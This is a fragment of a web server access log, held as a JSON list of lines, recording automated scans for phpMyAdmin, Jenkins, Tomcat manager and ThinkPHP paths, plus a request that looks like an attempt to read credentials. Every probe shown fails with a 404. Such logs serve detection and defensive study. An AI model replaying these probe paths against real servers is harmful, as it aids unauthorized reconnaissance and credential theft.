            "127.0.0.1 - - [29/Jan/2021:05:55:36 +0000] \"GET /sqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:37 +0000] \"GET /mysqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:38 +0000] \"GET /php-myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:38 +0000] \"GET /phpmy-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:39 +0000] \"GET /mysqladmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:40 +0000] \"GET /mysql-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:40 +0000] \"GET /admin/phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:41 +0000] \"GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:42 +0000] \"GET /admin/sysadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:42 +0000] \"GET /admin/sqladmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:43 +0000] \"GET /admin/db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:44 +0000] \"GET /admin/web/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:44 +0000] \"GET /admin/pMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:45 +0000] \"GET /mysql/pma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:46 +0000] \"GET /mysql/db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:46 +0000] \"GET /mysql/web/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:47 +0000] \"GET /mysql/pMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:48 +0000] \"GET /sql/phpmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:48 +0000] \"GET /sql/php-myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:49 +0000] \"GET /sql/phpmy-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:50 +0000] \"GET /sql/sql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:51 +0000] \"GET /sql/myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:51 +0000] \"GET /sql/webadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:52 +0000] \"GET /sql/sqlweb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:53 +0000] \"GET /sql/websql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:53 +0000] \"GET /sql/webdb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:54 +0000] \"GET /sql/sqladmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:55 +0000] \"GET /sql/sql-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:55 +0000] \"GET /sql/phpmyadmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:56 +0000] \"GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:57 +0000] \"GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:57 +0000] \"GET /db/myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:58 +0000] \"GET /db/webadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:59 +0000] \"GET /db/dbweb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:55:59 +0000] \"GET /db/websql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:00 +0000] \"GET /db/webdb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:01 +0000] \"GET /db/dbadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:01 +0000] \"GET /db/db-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:02 +0000] \"GET /db/phpmyadmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:03 +0000] \"GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:03 +0000] \"GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:04 +0000] \"GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:04 +0000] \"GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:05 +0000] \"GET /administrator/db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:06 +0000] \"GET /administrator/web/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:06 +0000] \"GET /administrator/pma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:07 +0000] \"GET /administrator/PMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:08 +0000] \"GET /administrator/admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:08 +0000] \"GET /phpMyAdmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:09 +0000] \"GET /phpMyAdmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:10 +0000] \"GET /phpMyAdmin4/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:10 +0000] \"GET /phpMyAdmin-3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:11 +0000] \"GET /php-my-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:12 +0000] \"GET /PMA2011/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:13 +0000] \"GET /PMA2012/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:13 +0000] \"GET /PMA2013/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:14 +0000] \"GET /PMA2014/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:15 +0000] \"GET /PMA2015/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:15 +0000] \"GET /PMA2016/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:16 +0000] \"GET /PMA2017/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:17 +0000] \"GET /PMA2018/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:18 +0000] \"GET /PMA2019/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:18 +0000] \"GET /PMA2020/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:19 +0000] \"GET /pma2011/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:20 +0000] \"GET /pma2012/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:20 +0000] \"GET /pma2013/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:21 +0000] \"GET /pma2014/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:22 +0000] \"GET /pma2015/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:22 +0000] \"GET /pma2016/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:23 +0000] \"GET /pma2017/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:24 +0000] \"GET /pma2018/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:24 +0000] \"GET /pma2019/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:25 +0000] \"GET /pma2020/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:26 +0000] \"GET /phpmyadmin2011/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:26 +0000] \"GET /phpmyadmin2012/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:27 +0000] \"GET /phpmyadmin2013/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:28 +0000] \"GET /phpmyadmin2014/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:28 +0000] \"GET /phpmyadmin2015/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:29 +0000] \"GET /phpmyadmin2016/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:30 +0000] \"GET /phpmyadmin2017/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:31 +0000] \"GET /phpmyadmin2018/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:31 +0000] \"GET /phpmyadmin2019/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:32 +0000] \"GET /phpmyadmin2020/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:05:56:32 +0000] \"GET /index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:07:04:53 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [29/Jan/2021:07:04:53 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - uQFc9urR [29/Jan/2021:07:04:53 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - suK7GB6T [29/Jan/2021:07:59:07 +0000] \"GET /manager/html/ HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [29/Jan/2021:08:34:00 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [29/Jan/2021:08:34:01 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - fGsQzYba [29/Jan/2021:08:34:02 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [29/Jan/2021:09:32:55 +0000] \"GET /TP/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:09:32:56 +0000] \"GET /TP/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:09:32:58 +0000] \"GET /thinkphp/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:09:32:59 +0000] \"GET /html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:09:33:00 +0000] \"GET /public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:09:33:03 +0000] \"GET /TP/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:09:33:05 +0000] \"GET /elrekt.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:09:33:05 +0000] \"GET /index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:10:05:36 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
            "127.0.0.1 - - [29/Jan/2021:10:29:13 +0000] \"GET /hudson HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 zgrab/0.x\"\n",
            "127.0.0.1 - - [29/Jan/2021:10:45:03 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [29/Jan/2021:10:45:04 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - FkF30u83 [29/Jan/2021:10:45:04 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
